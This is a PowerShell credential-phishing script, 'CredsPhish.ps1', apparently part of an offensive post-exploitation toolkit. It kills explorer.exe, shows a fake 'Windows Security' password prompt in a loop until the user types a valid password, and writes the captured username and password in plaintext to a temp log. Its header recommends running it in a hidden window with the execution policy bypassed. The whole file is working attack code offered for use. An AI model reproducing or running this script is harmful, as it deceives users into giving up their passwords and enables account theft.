<#
.SYNOPSIS
  Standalone Powershell script that will promp the current user for a valid credential.

  Author: enigma0x3 &('r00t-3xp10it')
  Required Dependencies: target Account Password set
  Optional Dependencies: None
  PS Script Dev Version: v1.1

.DESCRIPTION
   CredsPhish allows an attacker to craft a credentials prompt using Windows PromptForCredential,
   validate it against the DC or localmachine and in turn leak it via one remote logfile stored
   on target %TMP% folder. This module was inspired in @enigma0x3 phishing-for-credentials POC

.NOTES
   Its recomended to execute CredsPhish.ps1 in a hidden terminal windows.
   This CmdLet Requires service lmhosts running (program auxiliary TCP/IP NetBios)
   This CmdLet Requires service LanmanServer running (server)
   This CmdLet Requires Admin Privs to Start|Stop services

.EXAMPLE
   PS C:\> .\CredsPhish.ps1
   Run CmdLet in Demonstration Mode

.EXAMPLE
   PS C:\> powershell -exec bypass -W 1 -NonInteractive -NoLogo -File CredsPhish.ps1
   Run CmdLet in a hidden terminal prompt

.INPUTS
   None. You cannot pipe objects to CredsPhish.ps1

.OUTPUTS
   Saves CredsPhish.log to the selected directory. 'tmp' is the default.
 
.LINK
    https://github.com/r00t-3xp10it/meterpeter
    http://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask
    https://github.com/r00t-3xp10it/venom/blob/master/bin/meterpeter/mimiRatz/CredsPhish.ps1
    https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1
#>


$BypassStartup = "False"
## This CmdLet Requires service lmhosts running (program auxiliary TCP/IP NetBios)
$LMHostStatus = (Get-Service lmhosts -EA SilentlyContinue).Status
If(-not($LMHostStatus -ieq "Running")){
   Write-Host "[error] This CmdLet Requires service lmhosts running!" -ForegroundColor Red -BackgroundColor Black
   ## Check if we are running in higth integrity shell
   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
   If($IsClientAdmin){## Start-Service requires Administrator rigths to run
      Write-Host "[i] Trying to start service lmhosts!" -ForegroundColor Yellow
      Set-Service -Name "lmhosts" -Status running -StartupType automatic
      $BypassStartup = "True"
   }Else{## Administrator privileges required to start services
      Write-Host "[error] This CmdLet Requires Admin privileges to start lmhosts service!" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @CredsPhish
   }
}

## This CmdLet Requires service LanmanServer running (servidor)
$LMServerStatus = (Get-Service LanmanServer -EA SilentlyContinue).Status
If(-not($LMServerStatus -ieq "Running")){
   Write-Host "[error] This CmdLet Requires service LanmanServer running!" -ForegroundColor Red -BackgroundColor Black
   ## Check if we are running in higth integrity shell
   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
   If($IsClientAdmin){## Start-Service requires Administrator rigths to run
      Write-Host "[i] Trying to start service LanmanServer!" -ForegroundColor Yellow
      Set-Service -Name "LanmanServer" -Status running -StartupType automatic
      $BypassStartup = "True"
   }Else{## Administrator privileges required to start services
      Write-Host "[error] This CmdLet Requires Admin privileges to start LanmanServer service!" -ForegroundColor Red -BackgroundColor Black
      exit ## Exit @CredsPhish
   }
}


$account = $null
$timestamp = $null
taskkill /f /im explorer.exe

[int]$counter = 1
While($counter -lt '30'){## 30 fail attempts until abort
  $user    = [Environment]::UserName
  $domain  = [Environment]::UserDomainName

  Add-Type -assemblyname System.Windows.Forms
  Add-Type -assemblyname System.DirectoryServices.AccountManagement
  $DC = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)

  #$account = $Env:USERNAME
  $account = [System.Security.Principal.WindowsIdentity]::GetCurrent().name
  $credential = $host.ui.PromptForCredential("Windows Security", "Please enter your UserName and Password.", $account, "NetBiosUserName")
  $validate = $DC.ValidateCredentials($account, $credential.GetNetworkCredential().password)

    $user = $credential.GetNetworkCredential().username;
    $pass = $credential.GetNetworkCredential().password;
    If(-not($validate) -or $validate -eq $null){## Fail to validate credential input againt DC
      $logpath = Test-Path -Path "$Env:TMP\CredsPhish.log";If($logpath -eq $True){Remove-Item $Env:TMP\CredsPhish.log -Force}
      $msgbox = [System.Windows.Forms.MessageBox]::Show("Invalid Credentials, Please try again ..", "$account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
    }Else{## We got valid credentials
      $TimeStamp = Get-Date
      echo "" > $Env:TMP\CredsPhish.log
      echo "   Captured Credentials (logon)" >> $Env:TMP\CredsPhish.log
      echo "   ----------------------------" >> $Env:TMP\CredsPhish.log
      echo "   TimeStamp : $TimeStamp" >> $Env:TMP\CredsPhish.log
      echo "   username  : $user" >> $Env:TMP\CredsPhish.log
      echo "   password  : $pass" >> $Env:TMP\CredsPhish.log
      echo "" >> $Env:TMP\CredsPhish.log
      Get-Content $Env:TMP\CredsPhish.log
      Remove-Item -Path "$Env:TMP\CredsPhish.log" -Force
      Start-Process -FilePath $Env:WINDIR\explorer.exe

      ## Revert the Bypass function
      If($BypassStartup -ieq "True"){
         $PCName = $Env:COMPUTERNAME
         ## Stoping service lmhosts if $BypassStartup = True
         Get-Service -Computer $PCName -Name lmhosts|Stop-Service -Force
         Set-Service -Name "lmhosts" -Status stopped -StartupType disabled
         $Checks = (Get-Service -Computer $PCName -Name lmhosts).Status
         If($Checks -ieq "Stopped"){
            Write-Host "[i] Bypass: Service lmhosts stopped!" -ForegroundColor Green
            Start-Sleep -Seconds 1
         }Else{
            Write-Host "[x] Bypass: CmdLet cant Stop Service lmhosts!" -ForegroundColor Red -BackgroundColor Black         
         }

         ## Stoping service LanmanServer if $BypassStartup = True
         Get-Service -Computer $PCName -Name LanmanServer|Stop-Service -Force
         Set-Service -Name "LanmanServer" -Status stopped -StartupType disabled
         $Checks = (Get-Service -Computer $PCName -Name LanmanServer).Status
         If($Checks -ieq "Stopped"){
            Write-Host "[i] Bypass: Service LanmanServer stopped!" -ForegroundColor Green
            Start-Sleep -Seconds 1
         }Else{
            Write-Host "[x] Bypass: CmdLet cant Stop Service LanmanServer!" -ForegroundColor Red -BackgroundColor Black         
         }
      }
      exit ## Exit @CredsPhish
    }
    $counter++
}

